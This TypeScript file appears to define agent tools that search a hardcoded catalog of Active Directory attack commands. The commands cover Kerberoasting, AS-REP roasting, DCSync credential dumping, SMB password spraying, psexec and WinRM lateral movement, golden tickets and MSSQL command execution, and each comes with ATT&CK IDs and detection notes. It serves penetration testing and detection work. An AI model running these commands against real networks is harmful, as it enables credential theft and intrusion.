import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { Platform } from "../schema/unified-entry.js";

// ━━━ Helpers ━━━

function deduplicateByBinary(entries: any[]): any[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    if (seen.has(e.id)) return false;
    seen.add(e.id);
    return true;
  });
}

function summarizeKbEntry(e: any): Record<string, unknown> {
  return {
    id: e.id, binary: e.binary, platform: e.platform, catalog: e.catalogSource,
    functions: e.functions, stealth_score: e.stealthScore, description: e.description,
    attck_techniques: e.attckTechniques,
  };
}

// ━━━ Hardcoded WADComs (Windows/AD Commands) Data ━━━

interface WadcomEntry {
  name: string;
  description: string;
  command: string;
  attackType: string;
  service: string;
  requiredTool: string;
  attck: string[];
  detectionNotes: string;
}

const WADCOMS_DATA: WadcomEntry[] = [
  // Enumeration
  {
    name: "BloodHound Collection",
    description: "Collect Active Directory data for BloodHound graph analysis using SharpHound",
    command: "SharpHound.exe -c All --domain <DOMAIN> --ldapusername <USER> --ldappassword <PASS>",
    attackType: "Enumeration",
    service: "LDAP",
    requiredTool: "sharphound",
    attck: ["T1087.002", "T1069.002"],
    detectionNotes: "Monitor for LDAP queries typical of BloodHound collection. High volume LDAP reads.",
  },
  {
    name: "LDAP Domain Dump",
    description: "Dump Active Directory information via LDAP using ldapdomaindump",
    command: "ldapdomaindump -u '<DOMAIN>\\<USER>' -p '<PASS>' <DC_IP>",
    attackType: "Enumeration",
    service: "LDAP",
    requiredTool: "ldapdomaindump",
    attck: ["T1087.002"],
    detectionNotes: "Monitor LDAP bind and extensive query patterns from non-standard hosts.",
  },
  {
    name: "Enum4linux AD Enumeration",
    description: "Enumerate AD users, shares, groups via SMB/RPC using enum4linux-ng",
    command: "enum4linux-ng -A -u '<USER>' -p '<PASS>' <TARGET>",
    attackType: "Enumeration",
    service: "SMB",
    requiredTool: "enum4linux",
    attck: ["T1087.002", "T1135"],
    detectionNotes: "Monitor SMB/RPC enumeration patterns. Multiple IPC$ and SAMR calls.",
  },
  // Exploitation
  {
    name: "Impacket GetNPUsers (AS-REP Roast)",
    description: "Find and exploit accounts without Kerberos pre-authentication (AS-REP Roasting)",
    command: "impacket-GetNPUsers <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -format hashcat",
    attackType: "Exploitation",
    service: "Kerberos",
    requiredTool: "impacket",
    attck: ["T1558.004"],
    detectionNotes: "Monitor for AS-REQ without pre-authentication. Event ID 4768 with encryption type 0x17.",
  },
  {
    name: "Impacket GetUserSPNs (Kerberoast)",
    description: "Request TGS tickets for service accounts to crack offline (Kerberoasting)",
    command: "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile hashes.txt",
    attackType: "Exploitation",
    service: "Kerberos",
    requiredTool: "impacket",
    attck: ["T1558.003"],
    detectionNotes: "Monitor for TGS-REQ for unusual SPNs. Event ID 4769 with encryption type 0x17.",
  },
  {
    name: "Rubeus Kerberoast",
    description: "Perform Kerberoasting using Rubeus to extract service ticket hashes",
    command: "Rubeus.exe kerberoast /outfile:hashes.txt",
    attackType: "Exploitation",
    service: "Kerberos",
    requiredTool: "rubeus",
    attck: ["T1558.003"],
    detectionNotes: "Monitor Rubeus process execution. TGS requests for multiple SPNs.",
  },
  {
    name: "Impacket SecretsDump (DCSync)",
    description: "Perform DCSync attack to dump domain credentials via replication",
    command: "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-ntlm",
    attackType: "Exploitation",
    service: "LDAP",
    requiredTool: "impacket",
    attck: ["T1003.006"],
    detectionNotes: "Monitor DrsGetNCChanges replication requests from non-DC hosts. Event ID 4662.",
  },
  {
    name: "CrackMapExec SMB Spray",
    description: "Password spray across SMB endpoints using CrackMapExec",
    command: "crackmapexec smb <TARGET_RANGE> -u users.txt -p '<PASS>' --continue-on-success",
    attackType: "Exploitation",
    service: "SMB",
    requiredTool: "crackmapexec",
    attck: ["T1110.003"],
    detectionNotes: "Monitor for multiple failed logon events (4625) followed by success (4624).",
  },
  // Lateral Movement
  {
    name: "Impacket PSExec",
    description: "Remote command execution via SMB service creation using Impacket PSExec",
    command: "impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>",
    attackType: "Lateral Movement",
    service: "SMB",
    requiredTool: "impacket",
    attck: ["T1021.002", "T1569.002"],
    detectionNotes: "Monitor for service creation via SMB. Event ID 7045 for new service.",
  },
  {
    name: "Impacket WMIExec",
    description: "Remote command execution via WMI using Impacket wmiexec",
    command: "impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>",
    attackType: "Lateral Movement",
    service: "SMB",
    requiredTool: "impacket",
    attck: ["T1021.002", "T1047"],
    detectionNotes: "Monitor WMI process creation. Event ID 4688 with WmiPrvSE parent.",
  },
  {
    name: "CrackMapExec Command Execution",
    description: "Execute commands on remote hosts via SMB using CrackMapExec",
    command: "crackmapexec smb <TARGET> -u <USER> -p '<PASS>' -x 'whoami'",
    attackType: "Lateral Movement",
    service: "SMB",
    requiredTool: "crackmapexec",
    attck: ["T1021.002"],
    detectionNotes: "Monitor for remote process creation via SMB. Check for CME user-agent.",
  },
  {
    name: "Evil-WinRM Shell",
    description: "Interactive PowerShell shell via WinRM for lateral movement",
    command: "evil-winrm -i <TARGET> -u <USER> -p '<PASS>'",
    attackType: "Lateral Movement",
    service: "SMB",
    requiredTool: "evil-winrm",
    attck: ["T1021.006"],
    detectionNotes: "Monitor WinRM connections. Event ID 4624 logon type 3. PowerShell logging.",
  },
  // Persistence
  {
    name: "Rubeus Golden Ticket",
    description: "Create a Golden Ticket for persistent Kerberos authentication",
    command: "Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:<DOMAIN> /sid:<DOMAIN_SID> /user:Administrator /ptt",
    attackType: "Persistence",
    service: "Kerberos",
    requiredTool: "rubeus",
    attck: ["T1558.001"],
    detectionNotes: "Monitor for TGT with unusual lifetime or from unexpected source. Event ID 4768.",
  },
  {
    name: "Impacket TicketConverter",
    description: "Convert tickets between ccache and kirbi format for cross-platform use",
    command: "impacket-ticketConverter ticket.kirbi ticket.ccache",
    attackType: "Persistence",
    service: "Kerberos",
    requiredTool: "impacket",
    attck: ["T1550.003"],
    detectionNotes: "Monitor for ticket file creation and format conversion utilities.",
  },
  // MSSQL
  {
    name: "Impacket MSSQLClient",
    description: "Connect to MSSQL server for command execution and data exfiltration",
    command: "impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET> -windows-auth",
    attackType: "Exploitation",
    service: "MSSQL",
    requiredTool: "impacket",
    attck: ["T1505.001"],
    detectionNotes: "Monitor for MSSQL connections from unusual hosts. Audit xp_cmdshell usage.",
  },
  {
    name: "CrackMapExec MSSQL Execution",
    description: "Execute commands via MSSQL xp_cmdshell using CrackMapExec",
    command: "crackmapexec mssql <TARGET> -u <USER> -p '<PASS>' -x 'whoami' --local-auth",
    attackType: "Exploitation",
    service: "MSSQL",
    requiredTool: "crackmapexec",
    attck: ["T1505.001"],
    detectionNotes: "Monitor xp_cmdshell execution. MSSQL audit logs.",
  },
];

// ━━━ Tools ━━━

const wadcoms_search: ToolDef = {
  name: "wadcoms_search",
  description: "Search WADComs (Windows/AD Commands) catalog for Active Directory attack commands by keyword",
  schema: {
    keyword: z.string().describe("Keyword to search WADComs entries (e.g. 'kerberoast', 'dcsync', 'password')"),
  },
  async execute(args: { keyword: string }, ctx: ToolContext): Promise<ToolResult> {
    const kw = args.keyword.toLowerCase().trim();

    const matches = WADCOMS_DATA.filter(w =>
      w.name.toLowerCase().includes(kw) ||
      w.description.toLowerCase().includes(kw) ||
      w.command.toLowerCase().includes(kw) ||
      w.requiredTool.toLowerCase().includes(kw),
    );

    // Search WADComs KB catalog
    const kbEntries = ctx.knowledgeBase.searchByCatalog("wadcoms");
    const kbKeyword = deduplicateByBinary(
      kbEntries.filter(e =>
        e.binary.toLowerCase().includes(kw) ||
        e.description.toLowerCase().includes(kw),
      ),
    );

    // Also general keyword search
    const generalKb = deduplicateByBinary(ctx.knowledgeBase.searchByKeyword(kw, "windows"));
    const seen = new Set(kbKeyword.map(e => e.id));
    for (const e of generalKb) {
      if (!seen.has(e.id)) { seen.add(e.id); kbKeyword.push(e); }
    }

    return json({
      keyword: args.keyword,
      total_matches: matches.length,
      commands: matches.map(w => ({
        name: w.name,
        description: w.description,
        command: w.command,
        attack_type: w.attackType,
        service: w.service,
        required_tool: w.requiredTool,
        attck: w.attck,
        detection_notes: w.detectionNotes,
      })),
      kb_matches: kbKeyword.slice(0, 10).map(summarizeKbEntry),
      total_kb_matches: kbKeyword.length,
    });
  },
};

const wadcoms_by_attack_type: ToolDef = {
  name: "wadcoms_by_attack_type",
  description: "Filter WADComs commands by attack type: Enumeration, Exploitation, Lateral Movement, Persistence",
  schema: {
    attack_type: z.enum(["Enumeration", "Exploitation", "Lateral Movement", "Persistence"])
      .describe("Attack type to filter by"),
  },
  async execute(args: { attack_type: string }, ctx: ToolContext): Promise<ToolResult> {
    const matches = WADCOMS_DATA.filter(w => w.attackType === args.attack_type);

    return json({
      attack_type: args.attack_type,
      total: matches.length,
      commands: matches.map(w => ({
        name: w.name,
        description: w.description,
        command: w.command,
        service: w.service,
        required_tool: w.requiredTool,
        attck: w.attck,
        detection_notes: w.detectionNotes,
      })),
    });
  },
};

const wadcoms_by_service: ToolDef = {
  name: "wadcoms_by_service",
  description: "Filter WADComs commands by target service: LDAP, Kerberos, SMB, MSSQL",
  schema: {
    service: z.enum(["LDAP", "Kerberos", "SMB", "MSSQL"])
      .describe("Target AD service to filter commands by"),
  },
  async execute(args: { service: string }, ctx: ToolContext): Promise<ToolResult> {
    const matches = WADCOMS_DATA.filter(w => w.service === args.service);

    // Search KB for service-related entries
    const kbEntries = deduplicateByBinary(
      ctx.knowledgeBase.searchByKeyword(args.service.toLowerCase(), "windows"),
    );

    return json({
      service: args.service,
      total: matches.length,
      commands: matches.map(w => ({
        name: w.name,
        description: w.description,
        command: w.command,
        attack_type: w.attackType,
        required_tool: w.requiredTool,
        attck: w.attck,
        detection_notes: w.detectionNotes,
      })),
      kb_matches: kbEntries.slice(0, 10).map(summarizeKbEntry),
    });
  },
};

const wadcoms_by_required_tool: ToolDef = {
  name: "wadcoms_by_required_tool",
  description: "Filter WADComs commands by required tool: impacket, rubeus, crackmapexec, evil-winrm, etc.",
  schema: {
    tool: z.string().describe("Required tool name (e.g. 'impacket', 'rubeus', 'crackmapexec', 'evil-winrm')"),
  },
  async execute(args: { tool: string }, ctx: ToolContext): Promise<ToolResult> {
    const tool = args.tool.toLowerCase().trim();
    const matches = WADCOMS_DATA.filter(w => w.requiredTool.toLowerCase().includes(tool));

    // Search KB for tool-related entries
    const kbEntries = deduplicateByBinary(ctx.knowledgeBase.searchByKeyword(tool));

    if (matches.length === 0) {
      const availableTools = Array.from(new Set(WADCOMS_DATA.map(w => w.requiredTool)));
      return json({
        tool: args.tool,
        found: false,
        message: "No WADComs entries found for this tool.",
        available_tools: availableTools,
      });
    }

    return json({
      tool: args.tool,
      total: matches.length,
      commands: matches.map(w => ({
        name: w.name,
        description: w.description,
        command: w.command,
        attack_type: w.attackType,
        service: w.service,
        attck: w.attck,
        detection_notes: w.detectionNotes,
      })),
      kb_matches: kbEntries.slice(0, 10).map(summarizeKbEntry),
    });
  },
};

export const wadcomsTools: ToolDef[] = [
  wadcoms_search,
  wadcoms_by_attack_type,
  wadcoms_by_service,
  wadcoms_by_required_tool,
];
